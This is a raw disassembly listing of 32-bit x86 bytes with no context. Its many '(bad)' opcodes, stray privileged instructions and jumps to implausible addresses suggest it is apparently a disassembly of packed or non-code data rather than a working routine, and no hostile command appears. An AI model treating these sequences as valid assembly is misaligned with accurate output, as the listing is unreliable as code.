  430fd8:	sbb    al,0xee
  430fda:	pop    esi
  430fdb:	call   0x83100b
  430fe0:	fsubr  st,st(3)
  430fe2:	sti    
  430fe3:	add    BYTE PTR gs:[ecx],bh
  430fe6:	add    eax,esp
  430fe8:	add    DWORD PTR [esi],eax
  430fea:	rol    DWORD PTR [ebp+0x8],0x29
  430fee:	mov    esp,eax
  430ff0:	clc    
  430ff1:	jne    0x431068
  430ff3:	mov    eax,0x8b0673
  430ff8:	loopne 0x43103f
  430ffa:	loopne 0x430f85
  430ffc:	lods   al,BYTE PTR ds:[esi]
  430ffd:	int3   
  430ffe:	inc    ebp
  430fff:	mov    DWORD PTR gs:[eax+edi*8],eax
  431003:	add    al,0xc3
  431005:	sub    ecx,DWORD PTR [ebp+0x47]
  431008:	(bad)  
  43100a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43100e:	add    eax,DWORD PTR [eax]
  431010:	call   0x644d115
  431015:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43101b:	dec    esi
  43101c:	ins    DWORD PTR es:[edi],dx
  43101d:	in     al,dx
  43101e:	lea    eax,[eax]
  431020:	inc    ebp
  431021:	inc    ebp
  431022:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431028:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431032:	and    al,0xdc
  431034:	ror    DWORD PTR [edx+0x24],0xf7
  431038:	or     BYTE PTR [ebp+0x4c],dh
  43103b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43103f:	stos   BYTE PTR es:[edi],al
  431040:	adc    edx,edi
  431042:	inc    esp
  431043:	add    edi,DWORD PTR [eax]
  431045:	jne    0x43102a
  431047:	mov    DWORD PTR [eax-0x7449db04],ecx
  43104d:	cmp    ecx,DWORD PTR [edi]
  43104f:	sub    BYTE PTR [ebp-0x7e],dl
  431052:	sar    ebp,0xb
  431055:	jmp    FWORD PTR [edi+0x2400392a]
  43105b:	sub    esi,DWORD PTR [ebx-0x73]
  43105e:	mov    esp,DWORD PTR [ecx+edi*4]
  431061:	mov    ecx,DWORD PTR [eax]
  431063:	and    BYTE PTR [eax],al
  431065:	jne    0x431031
  431067:	sub    ebp,ecx
  431069:	sbb    BYTE PTR [esi+0x32],ah
  43106c:	dec    ebp
  43106d:	push   ebp
  43106e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431074:	ret    
  431075:	mov    edx,ebp
  431077:	leave  
  431078:	sub    DWORD PTR [esi+0x24],ebx
  43107b:	ret    0x2b
  43107e:	pop    ax
  431080:	push   ebp
  431081:	rol    BYTE PTR [ebx],0xeb
  431084:	add    DWORD PTR [ecx+0x6c0001],0x40
  43108b:	jb     0x4310e2
  43108d:	ret    
  43108e:	in     al,dx
  43108f:	jecxz  0x43101c
  431091:	push   esi
  431092:	xchg   esp,eax
  431093:	jne    0x431095
  431095:	cmp    edx,DWORD PTR [esi+0x1c]
  431098:	jne    0x43107e
  43109a:	mov    eax,DWORD PTR [ebp-0x77]
  43109d:	ror    DWORD PTR [ebx+0x899408],0xe0
  4310a4:	mov    esi,DWORD PTR [ebp-0x75]
  4310a7:	pop    esi
  4310a8:	nop
  4310a9:	mov    eax,DWORD PTR [eax]
  4310ab:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4310b1:	add    al,0x0
  4310b3:	inc    ebp
  4310b4:	mov    eax,DWORD PTR [ebx]
  4310b6:	mov    ebp,ebx
  4310b8:	cmp    al,0xf
  4310ba:	or     al,al
  4310bc:	inc    ebp
  4310bd:	inc    ebp
  4310be:	xor    eax,0x8bc89c8b
  4310c3:	ins    BYTE PTR es:[edi],dx
  4310c4:	cld    
  4310c5:	add    BYTE PTR [edi+0x536c16c0],dh
  4310cb:	add    BYTE PTR [ecx-0x5],dl
  4310ce:	add    eax,0x17200
  4310d3:	sbb    al,0x85
  4310d5:	dec    esp
  4310d6:	je     0x431110
  4310d8:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4310dc:	add    BYTE PTR [ebx],bh
  4310de:	(bad)  
  4310df:	and    al,0x34
  4310e1:	jae    0x43107f
  4310e3:	mov    cl,cl
  4310e5:	inc    DWORD PTR [esp]
  4310e8:	push   ebp
  4310e9:	shr    esp,0x8
  4310ec:	in     al,dx
  4310ed:	push   esp
  4310ee:	add    DWORD PTR [eax],esp
  4310f0:	add    bl,cl
  4310f2:	inc    ebp
  4310f3:	mov    bh,0x89
  4310f5:	add    ah,bh
  4310f7:	jmp    0xca772041
  4310fc:	pushf  
  4310fd:	dec    esp
  4310fe:	push   ebx
  4310ff:	and    BYTE PTR [ebp+0x17],al
  431102:	xor    eax,0x56009cd9
  431107:	add    BYTE PTR [ebp+0x2b],al
  43110a:	in     eax,0xc1
  43110c:	inc    ebp
  43110d:	add    eax,0xc601d8
  431112:	mov    al,0xc6
  431115:	ins    BYTE PTR es:[edi],dx
  431116:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43111d:	dec    esp
  43111e:	xor    esp,DWORD PTR [eax]
  431120:	(bad)  
  431121:	fxch   st(1)
  431123:	sub    DWORD PTR [ebx],esi
  431125:	add    BYTE PTR [edx-0x40],bl
  431128:	mov    eax,0x248d8d00
  43112e:	xor    eax,0x188b0fc3
  431133:	push   ecx
  431134:	fimul  DWORD PTR [edx+0x8801d9]
  43113a:	or     DWORD PTR [ebx+0x36ed0806],0x45
  431141:	xor    ebx,ebp
  431143:	mov    al,BYTE PTR [ebp+0x1]
  431146:	jmp    0xdb4c564b
  43114b:	mov    dl,0x45
  43114d:	add    esi,ebp
  43114f:	add    BYTE PTR [ebp+0xe],al
  431152:	sub    DWORD PTR [edx+0x2e0145],eax
  431158:	inc    ebp
  431159:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  43115d:	add    eax,DWORD PTR [edi+eax*8-0x24]
  431161:	cld    
  431162:	mov    dh,0xa5
  431164:	xor    edi,eax
  431166:	add    eax,DWORD PTR [ebp+0x46]
  431169:	prefetcht0 BYTE PTR [ecx-0x2]
  43116d:	xor    eax,0x7c60872
  431172:	mov    esp,0xbd32c69a
  431177:	pop    esi
  431178:	mov    cl,0xbe
  43117b:	or     al,0xc6
  43117d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431184:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43118b:	add    dh,al
  43118d:	mov    eax,ebx
  43118f:	xor    DWORD PTR [ebx],0x35008dbc
  431195:	mov    ecx,DWORD PTR [edi]
  431197:	sbb    al,0x18
  431199:	inc    ebp
  43119a:	fcmovb st,st(7)
  43119c:	fxtract 
  43119e:	mov    BYTE PTR [ebp-0x38f7077d],al
  4311a4:	in     eax,dx
  4311a5:	call   0xf942972f
  4311aa:	inc    esi
  4311ac:	inc    ebp
  4311ad:	les    ecx,FWORD PTR [ebx-0x103a273a]
  4311b3:	push   edi
  4311b4:	adc    eax,DWORD PTR [ebp-0x77]
  4311b7:	out    0x8b,eax
  4311b9:	inc    ebp
  4311ba:	cmp    BYTE PTR [ecx],ch
  4311bc:	inc    DWORD PTR [ebp+0x3b]
  4311bf:	inc    ebp
  4311c0:	jne    0x4311f0
  4311c2:	(bad)  
  4311c3:	(bad)  
  4311c4:	mov    eax,0xf87c8545
  4311c9:	test   BYTE PTR [ebp-0x47],0xea
  4311cd:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  4311d4:	xor    BYTE PTR [esi+0x3003301],0x38
  4311db:	inc    esi
  4311dc:	test   DWORD PTR [eax],ebx
  4311de:	add    bh,dh
  4311e0:	add    BYTE PTR [edx+0x45],dh
  4311e3:	(bad)  
  4311e4:	mov    ebx,esp
  4311e6:	jl     0x4311ae
  4311e8:	add    ch,bl
  4311ea:	mov    esi,eax
  4311ec:	mov    ebx,esi
  4311ee:	cld    
  4311ef:	mov    BYTE PTR [eax+0xc601df],0xe0
  4311f6:	cmp    dh,al
  4311f8:	imul   esp,ecx,0xe28dc600
  4311fe:	shl    DWORD PTR [ebx],1
  431200:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431206:	mov    ebx,DWORD PTR [eax]
  431208:	data16 fiadd DWORD PTR [ebp-0x770027]
  43120f:	add    eax,0x7
  431212:	in     ax,dx
  431214:	test   DWORD PTR [ebp-0x1],eax
  431217:	jmp    0xe48a581b
  43121c:	inc    bp
  43121e:	test   eax,esp
  431220:	inc    DWORD PTR [ebp-0x1]
  431223:	cmc    
  431224:	rol    BYTE PTR [ebp+0x66],0xdf
  431228:	test   DWORD PTR [ebp-0x1],eax
  43122b:	in     al,dx
  43122c:	inc    DWORD PTR [ebp+0x47]
  43122f:	out    0x66,eax
  431231:	inc    ebp
  431232:	test   DWORD PTR [edi+edi*8-0xa],edi
  431236:	inc    DWORD PTR [eax+eax*8-0x44]
  43123a:	data16 mov dh,0x85
  43123d:	xor    edi,edi
  43123f:	add    edi,edi
  431241:	inc    esi
  431242:	inc    edi
  431243:	sbb    BYTE PTR [esi-0x2],ah
  431246:	test   DWORD PTR [edx-0x1],esi
  431249:	(bad)  
  43124a:	(bad)  
  43124b:	cmp    bh,al
  43124d:	dec    DWORD PTR [ecx-0x278b77]
  431253:	dec    ebp
  431254:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  43125b:	add    edi,edi
  43125d:	lea    edi,[eax+0xff99ff]
  431263:	enter  0xe89,0x78
  431267:	inc    ebp
  431268:	push   DWORD PTR ds:0xc7829cb8
  43126e:	add    BYTE PTR [eax-0x7857a77],bh
  431274:	inc    DWORD PTR [ebp-0x48]
  431277:	mov    edx,edi
  431279:	mov    WORD PTR [eax],es
  43127b:	add    BYTE PTR [ecx-0xf083c7],cl
  431281:	pop    edi
  431282:	add    DWORD PTR [eax],0xffffffe4
  431285:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43128b:	add    DWORD PTR [eax+0x382700],edi
  431291:	inc    ebp
  431292:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431298:	add    BYTE PTR [ecx+0x4f45b866],cl
  43129e:	lea    eax,[eax]
  4312a0:	add    eax,0x89660878
  4312a5:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  4312ac:	loopne 0x431237
  4312ae:	(bad)  
  4312af:	data16 aam 0xff
  4312b2:	in     al,dx
  4312b3:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  4312b8:	pop    ecx
  4312b9:	push   0x8ddaff18
  4312be:	jmp    0x4312bf
  4312c0:	mov    BYTE PTR [ecx-0x8a95c0],cl
  4312c6:	lea    eax,[ebx-0x767aee30]
  4312cc:	(bad)  
  4312cd:	ins    BYTE PTR es:[edi],dx
  4312ce:	(bad)  
  4312cf:	inc    DWORD PTR [ebp-0xfb0173]
  4312d5:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  4312db:	adc    DWORD PTR [ecx+0x3d],0x33
  4312df:	mov    DWORD PTR [ebx+0xff7270],edi
  4312e5:	(bad)  
  4312e6:	ret    
  4312e7:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  4312ed:	call   DWORD PTR [eax-0x75]
  4312f0:	inc    ebp
  4312f1:	mov    ax,WORD PTR [ebp-0xff0068]
  4312f8:	mov    eax,0x85ff66b0
  4312fe:	add    edi,edi
  431300:	add    bh,bh
  431302:	(bad)  
  431303:	stc    
  431304:	inc    DWORD PTR [eax]
  431306:	or     BYTE PTR [esi+0x45],ah
  431309:	test   DWORD PTR [ebp-0x7e008a01],eax
  43130f:	outs   dx,BYTE PTR ds:[esi]
  431310:	pop    DWORD PTR [eax]
  431312:	adc    ah,BYTE PTR [esi-0x78]
  431315:	test   DWORD PTR [eax-0x1],esi
  431318:	mov    ecx,0x6b4fff
  43131d:	add    cl,al
  43131f:	mov    WORD PTR [ebp-0x3f0078],ax
  431326:	mov    eax,eax
  431328:	data16 push bp
  43132b:	test   DWORD PTR [ebp-0x76000201],ecx
  431331:	dec    esp
  431332:	mov    WORD PTR [eax],es
  431334:	ret    0x6666
  431337:	inc    ebp
  431338:	push   ebp
  431339:	mov    eax,0xf3478d
  43133e:	mov    DWORD PTR [ecx+0x47c28290],ecx
  431344:	pushw  0x55
  431347:	lea    ax,[ebp-0x1f]
  43134b:	(bad)  
  43134c:	mov    eax,edx
  43134e:	xchg   esp,eax
  43134f:	in     al,0x89
  431351:	cmc    
  431352:	xchg   esi,eax
  431353:	inc    ebp
  431354:	iret   
  431355:	fisttp WORD PTR [ecx+0x4a8d98e7]
  43135b:	ror    BYTE PTR [ebx+0x5532668a],1
  431361:	or     BYTE PTR [ebx+0x55186639],0x49
  431368:	(bad)  
  431369:	repz cmp eax,0xa0898945
  43136f:	mov    ah,0x89
  431371:	jmp    DWORD PTR [edx+0x66b0418d]
  431377:	inc    DWORD PTR [ebp+0x50]
  43137a:	add    DWORD PTR [ebp-0xd],0xffffffbe
  43137e:	mov    DWORD PTR [eax],ecx
  431380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431381:	pop    es
  431382:	inc    ecx
  431383:	(bad)  
  431384:	call   0x366:0x3245
  43138a:	dec    ebp
  43138b:	push   eax
  43138c:	inc    bp
  43138e:	jge    0x431313
  431390:	mov    esp,DWORD PTR [esi-0x18]
  431393:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431399:	add    DWORD PTR [ebx],esi
  43139b:	add    BYTE PTR [ebx],al
  43139d:	test   DWORD PTR [ebx],esi
  43139f:	(bad)  
  4313a0:	inc    WORD PTR [ebp+0x0]
  4313a4:	mov    eax,DWORD PTR [eax]
  4313a6:	call   0x8898cadb
  4313ab:	mov    esi,eax
  4313ad:	clc    
  4313ae:	ret    
  4313af:	rol    cl,0xa
  4313b2:	mov    DWORD PTR ds:0x7c0ec88,esi
  4313b8:	mov    edx,edi
  4313ba:	pushf  
  4313bb:	pop    es
  4313bc:	jmp    DWORD PTR [edx+0x66]
  4313bf:	add    BYTE PTR [ebp-0x990175],al
  4313c5:	inc    ebp
  4313c6:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4313cc:	push   ebp
  4313cd:	mov    edi,eax
  4313cf:	mov    dh,BYTE PTR [eax+0x266ff51]
  4313d5:	push   ebp
  4313d6:	add    BYTE PTR [ebx-0x764b0777],al
  4313dc:	dec    DWORD PTR [esi+0x661851e8]
  4313e2:	add    BYTE PTR [ebp-0x7b],dl
  4313e5:	cmp    esi,0xfffffff3
  4313e8:	dec    DWORD PTR [ecx+0x51fe9285]
  4313ee:	jmp    DWORD PTR [esi-0x75]
  4313f1:	push   ebp
  4313f2:	hlt    
  4313f3:	data16 (bad) 
  4313f5:	dec    ebp
  4313f6:	ret    
  4313f7:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313fd:	lea    edx,[eax-0x1]
  431400:	jne    0x4313d3
  431402:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431408:	dec    BYTE PTR [ecx+0x51559eff]
  43140e:	mov    DWORD PTR [esi-0x4c],esp
  431411:	push   ebp
  431412:	jmp    DWORD PTR [esi-0x18]
  431415:	inc    ebp
  431416:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43141c:	(bad)  
  43141d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43141e:	inc    eax
  431420:	test   DWORD PTR [esi-0x2],esp
  431423:	inc    ebp
  431424:	dec    DWORD PTR [ebp-0x760bde75]
  43142a:	(bad)  
  43142b:	test   al,0xc3
  43142d:	mov    DWORD PTR [ebp-0x769b56],ecx
  431433:	lods   al,BYTE PTR ds:[esi]
  431434:	push   eax
  431435:	inc    ebp
  431436:	jne    0x431447
  431438:	dec    DWORD PTR [ebp+0x8]
  43143b:	mov    eax,DWORD PTR [ebx]
  43143d:	sbb    al,0x0
  43143f:	(bad)  
  431440:	mov    eax,0xc14fc3
  431445:	mov    DWORD PTR [eax-0x64],edi
  431448:	inc    bp
  43144a:	test   DWORD PTR [edi],ecx
  43144c:	dec    DWORD PTR [ebp-0x1]
  43144f:	xor    eax,edi
  431451:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  431457:	inc    ebp
  431458:	xor    DWORD PTR [ebx],0x3f
  43145b:	mov    WORD PTR [ebp-0x1bc],ax
  431462:	lea    ecx,[ecx-0x767702]
  431468:	inc    esi
  431469:	(bad)  
  43146a:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  431471:	pushf  
  431472:	rol    DWORD PTR [ebp-0x72019a],0xff
  431479:	add    bh,bh
  43147b:	add    BYTE PTR [edi],cl
  43147d:	test   DWORD PTR [eax],eax
  43147f:	(bad)  
  431480:	dec    WORD PTR [ebp-0xff0031]
  431487:	mov    DWORD PTR [ecx-0xb748],ecx
  43148d:	lea    eax,[ebx+0x7cffc1b0]
  431493:	push   eax
  431494:	add    BYTE PTR [ebp+0x66],al
  431497:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43149d:	test   eax,esi
  43149f:	(bad)  
  4314a0:	fdiv   st(7),st
  4314a2:	add    bh,bh
  4314a4:	data16 clc 
  4314a6:	lea    edx,[ebp-0x1]
  4314a9:	(bad)  
  4314aa:	dec    DWORD PTR [eax-0x72b50077]
  4314b0:	dec    DWORD PTR [eax-0x1237a73]
  4314b6:	(bad)  
  4314b7:	(bad)  
  4314b8:	(bad)  
  4314b9:	cdq    
  4314ba:	inc    DWORD PTR [eax]
  4314bc:	ja     0x431447
  4314be:	lea    edi,[eax-0x72000050]
  4314c4:	push   ecx
  4314c5:	mov    al,0x4d
  4314c7:	jmp    DWORD PTR [esi+0x50]
  4314ca:	mov    ch,0x45
  4314cc:	push   DWORD PTR [ebx]
  4314ce:	inc    DWORD PTR [ebx]
  4314d0:	push   ebx
  4314d1:	push   eax
  4314d2:	push   ecx
  4314d3:	test   DWORD PTR [ebx],esi
  4314d5:	(bad)  
  4314d6:	mov    ebx,0xff72ff
  4314db:	clc    
  4314dc:	retf   
  4314dd:	push   ebp
  4314de:	(bad)  
  4314df:	jmp    0x1421624
  4314e4:	push   ecx
  4314e5:	jae    0x4314a7
  4314e7:	add    BYTE PTR [ebp-0x38bb73],cl
  4314ed:	mov    DWORD PTR [ecx+0x40],edx
  4314f0:	(bad)  
  4314f1:	(bad)  
  4314f2:	cld    
  4314f3:	mov    eax,DWORD PTR [ebp-0x7a019a]
  4314f9:	inc    DWORD PTR [ebp-0x3f0101]
  4314ff:	inc    bp
  431501:	test   DWORD PTR [ebx+0xff98ff],ecx
  431507:	inc    edi
  431508:	(bad)  
  431509:	dec    si
  43150b:	test   edi,edi
  43150d:	(bad)  
  43150e:	cmp    eax,0xc74f7bff
  431513:	mov    edx,DWORD PTR [edx-0x7d]
  431516:	(bad)  
  431517:	mov    ebx,0x563a8931
  43151c:	(bad)  
  43151d:	call   FWORD PTR [esi-0x47]
  431520:	inc    DWORD PTR ds:0x893c00e2
  431526:	mov    DWORD PTR [eax-0x4c],ebx
  431529:	(bad)  
  43152a:	jmp    DWORD PTR [esi-0x1]
  43152d:	test   edi,edi
  43152f:	dec    DWORD PTR [eax]
  431531:	(bad)  
  431532:	inc    eax
  431534:	or     BYTE PTR [ecx+0x8b5745],bh
  43153a:	sbb    al,0x89
  43153c:	rcr    BYTE PTR [edx-0x7c],0xff
  431540:	add    ecx,DWORD PTR [ebx+0x6165b900]
  431546:	add    BYTE PTR [eax],al
  431548:	inc    ebp
  431549:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  43154f:	data16 fdiv DWORD PTR [ebp-0x7007b]
  431556:	inc    ebp
  431557:	dec    ebp
  431558:	cmp    DWORD PTR [ecx-0x38b764],ecx
  43155e:	lock lea eax,[ebp+0x458df81c]
  431565:	(bad)  
  431566:	xor    eax,0x8b8b9fff
  43156b:	hlt    
  43156c:	cld    
  43156d:	mov    DWORD PTR [eax+0xff014c],eax
  431573:	mov    esi,0x78b0845
  431578:	cld    
  431579:	into   
  43157a:	dec    ebp
  43157b:	call   0x5100:0x38c328b
  431582:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431588:	add    BYTE PTR [ebx],dh
  43158a:	mov    DWORD PTR [eax-0x1c],eax
  43158d:	lea    edi,[ebp-0x2]
  431590:	test   edi,edi
  431592:	jne    0x4315e4
  431594:	push   DWORD PTR [ebp+0x18]
  431597:	mov    DWORD PTR [ebp+0x44],edx
  43159a:	call   0xffcd109e
  43159f:	mov    al,0x45
  4315a1:	dec    DWORD PTR [ebx+0x3fc8b8b]
  4315a7:	cmp    BYTE PTR [ecx+eax*1],0xf
  4315ab:	add    BYTE PTR [ebp-0x7b],al
  4315ae:	test   edi,edi
  4315b0:	je     0x4315b1
  4315b2:	dec    DWORD PTR [edi-0x4]
  4315b5:	dec    edi
  4315b6:	or     al,BYTE PTR [ebp-0x740001]
  4315bc:	cld    
  4315bd:	dec    edi
  4315be:	or     BYTE PTR [edi+0x1],0x85
  4315c2:	add    bh,bh
  4315c4:	add    bh,bh
  4315c6:	(bad)  
  4315c7:	icebp  
  4315c8:	ret    
  4315c9:	dec    edi
  4315ca:	inc    ebp
  4315cb:	xchg   ebp,eax
  4315cc:	jne    0x4315cc
  4315ce:	mov    edi,edi
  4315d0:	cld    
  4315d1:	xor    BYTE PTR [ecx+0x500155],cl
  4315d7:	push   ebp
  4315d8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4315de:	add    BYTE PTR [ebp+0x35e90f50],al
  4315e4:	add    al,BYTE PTR [eax]
  4315e6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315ec:	add    ah,ch
  4315ee:	or     BYTE PTR [ebp+0x4501f845],dh
  4315f4:	jmp    0xdf18ee
  4315f9:	(bad)  
  4315fa:	nop    ecx
  4315fd:	test   DWORD PTR [ebp+0x4502f8],eax
  431603:	cmp    ecx,DWORD PTR [ebp-0x64]
  431606:	mov    eax,edi
  431608:	mov    ebx,DWORD PTR [eax+edx*2]
  43160b:	add    eax,0x45fef885
  431610:	dec    DWORD PTR [ebx+0x339445]
  431616:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43161c:	dec    DWORD PTR [ebx-0x460f0375]
  431622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431623:	add    esi,edi
  431625:	add    bh,bh
  431627:	rdpmc  
  431629:	add    BYTE PTR [ebx],0x1
  43162c:	mov    DWORD PTR [eax],eax
  43162e:	add    al,0x45
  431630:	dec    DWORD PTR [ecx-0x360b3373]
  431636:	dec    DWORD PTR [esi]
  431638:	push   eax
  431639:	jne    0x431680
  43163b:	mov    esi,DWORD PTR [ebx]
  43163d:	cld    
  43163e:	add    ebp,ebp
  431640:	push   eax
  431641:	inc    DWORD PTR [ebp-0x75]
  431644:	add    eax,0x800e4
  431649:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43164f:	mov    DWORD PTR [ecx],eax
  431651:	sbb    al,0x0
  431653:	leave  
  431654:	test   DWORD PTR [edi-0x2],eax
  431657:	jne    0x431658
  431659:	call   0xff44015e
  43165e:	xor    BYTE PTR [ebp+0x4d],al
  431661:	mov    edi,edi
  431663:	enter  0x8,0x4d
  431667:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43166d:	mov    eax,DWORD PTR [eax]
  43166f:	cld    
  431670:	add    DWORD PTR [ecx],ebx
  431672:	inc    ebp
  431673:	dec    ebp
  431674:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43167a:	inc    eax
  43167b:	dec    DWORD PTR [ecx-0x270375]
  431681:	add    BYTE PTR [ebx-0x39d72701],cl
  431687:	xchg   ecx,eax
  431688:	ret    
  431689:	add    BYTE PTR [ebp-0x830075],al
  43168f:	add    BYTE PTR [ebp-0x75],al
  431692:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431698:	lea    edi,[edi-0xc]
  43169b:	add    bh,bh
  43169d:	mov    edx,DWORD PTR [eax-0x7b]
  4316a0:	inc    ebp
  4316a1:	rdpmc  
  4316a3:	jne    0x4316a8
  4316a5:	add    BYTE PTR [eax-0x75],dl
  4316a8:	inc    ebp
  4316a9:	clc    
  4316aa:	add    eax,0x400009
  4316af:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4316b5:	mov    eax,DWORD PTR [ecx]
  4316b7:	in     al,dx
  4316b8:	add    dh,al
  4316ba:	test   ebx,eax
  4316bc:	inc    BYTE PTR [ebp-0xff0001]
  4316c2:	add    BYTE PTR [ebp-0x43],al
  4316c5:	cmp    esi,0xfffffff8
  4316c8:	(bad)  
  4316c9:	push   DWORD PTR [eax]
  4316cb:	add    BYTE PTR [ebp-0x3a],dl
  4316ce:	test   ebx,eax
  4316d0:	je     0x431657
  4316d2:	mov    edi,edi
  4316d4:	sbb    al,0xff
  4316d6:	test   DWORD PTR gs:[eax],eax
  4316d9:	(bad)  
  4316da:	js     0x4316db
  4316dc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4316e2:	sub    eax,ebx
  4316e4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316ea:	add    eax,DWORD PTR [eax]
  4316ec:	dec    ebp
  4316ed:	push   eax
  4316ee:	mov    al,BYTE PTR [ebp+0x1]
  4316f1:	mov    eax,DWORD PTR [ebp-0x68]
  4316f4:	mov    eax,DWORD PTR [eax]
  4316f6:	sbb    bh,al
  4316f8:	or     ah,dh
  4316fa:	dec    ebp
  4316fb:	inc    DWORD PTR [eax+0x4]
  4316fe:	push   ecx
  4316ff:	add    BYTE PTR [edx-0x1],dh
  431702:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431708:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431712:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431718:	push   ecx
  431719:	cmp    BYTE PTR [ebx],al
  43171b:	inc    ebp
  43171c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431722:	(bad)  
  431723:	(bad)  
  431724:	in     al,0xff
  431726:	add    BYTE PTR [ebp+0x0],al
  431729:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43172f:	add    al,bh
  431731:	(bad)  
  431732:	jmp    0x8d85:0x74b0558d
  431739:	dec    DWORD PTR [eax]
  43173b:	call   DWORD PTR [ebp-0x7b]
  43173e:	mov    edi,esi
  431740:	lock call DWORD PTR [ebp-0x75]
  431744:	mov    esi,esp
  431746:	mov    ah,0xc6
  431748:	mov    bh,0xc3
  43174a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431750:	add    DWORD PTR [eax],0x450050ff
  431756:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43175c:	inc    edi
  43175e:	push   esp
  431760:	jmp    0xcd00:0x660481ff
  431767:	mov    DWORD PTR [ebx],esi
  431769:	clc    
  43176a:	cmp    edi,0xff9cff3a
  431770:	jne    0x43177a
  431772:	mov    eax,eax
  431774:	add    esi,DWORD PTR [eax]
  431776:	int3   
  431777:	inc    ebp
  431778:	cmp    al,0x83
  43177a:	add    BYTE PTR [eax],bl
  43177c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431782:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431788:	mov    edi,eax
  43178a:	cmp    BYTE PTR [ebp+0x45],cl
  43178d:	jmp    0x43171a
  43178f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431792:	inc    ebp
  431793:	or     al,0x2
  431795:	dec    DWORD PTR [ebp+0x18]
  431798:	jne    0x4317ef
  43179a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4317a0:	mov    edi,DWORD PTR [ebx]
  4317a2:	in     al,0x50
  4317a4:	xchg   ecx,eax
  4317a5:	jmp    0x34366aa
  4317aa:	adc    al,0x8b
  4317ac:	inc    ebp
  4317ad:	mov    al,ds:0x8b04008b
  4317b2:	push   ebp
  4317b3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4317b9:	push   ebp
  4317ba:	test   DWORD PTR [ebx-0x2800d701],ecx
  4317c0:	inc    ebp
  4317c1:	dec    ebp
  4317c2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4317c8:	mov    DWORD PTR [eax],0xe9ff00f4
  4317ce:	add    al,0x0
  4317d0:	add    BYTE PTR [eax],al
  4317d2:	mov    eax,edx
  4317d4:	push   eax
  4317d5:	rol    DWORD PTR [ebp-0xf0177],1
  4317db:	bound  eax,QWORD PTR [ebp+0x50]
  4317de:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317e4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317ea:	mov    al,0xf
  4317ec:	test   DWORD PTR [edx],edx
  4317ee:	call   DWORD PTR [ebp-0x7a0001]
  4317f4:	(bad)  
  4317f5:	loop   0x4317f6
  4317f7:	jnp    0xc6990bfd
  4317fd:	mov    eax,ebx
  4317ff:	cmp    al,0x8b
  431801:	(bad)  
  431802:	cld    
  431803:	shr    esi,0xc
  431806:	add    dl,al
  431808:	push   eax
  431809:	lea    eax,[ebp-0x1]
  43180c:	mov    edx,esi
  43180e:	cwde   
  43180f:	cli    
  431810:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431816:	or     BYTE PTR [eax],cl
  431818:	inc    ebp
  431819:	dec    ebp
  43181a:	inc    DWORD PTR [ebx+0x74803914]
  431820:	add    DWORD PTR [ebx+0x451800],ecx
  431826:	call   DWORD PTR [eax+edx*1]
  431829:	add    ecx,DWORD PTR [ebp-0x34]
  43182c:	push   edi
  43182d:	adc    al,0x8
  43182f:	mov    edx,DWORD PTR [ebp-0x14]
  431832:	mov    ecx,DWORD PTR [ebp+0x18]
  431835:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431839:	inc    DWORD PTR [eax+esi*8]
  43183c:	inc    ebp
  43183d:	stos   BYTE PTR es:[edi],al
  43183e:	mov    edx,DWORD PTR [ebp-0x4]
  431841:	add    DWORD PTR [ebp-0x1c],eax
  431844:	mov    edx,DWORD PTR [ebp-0x70]
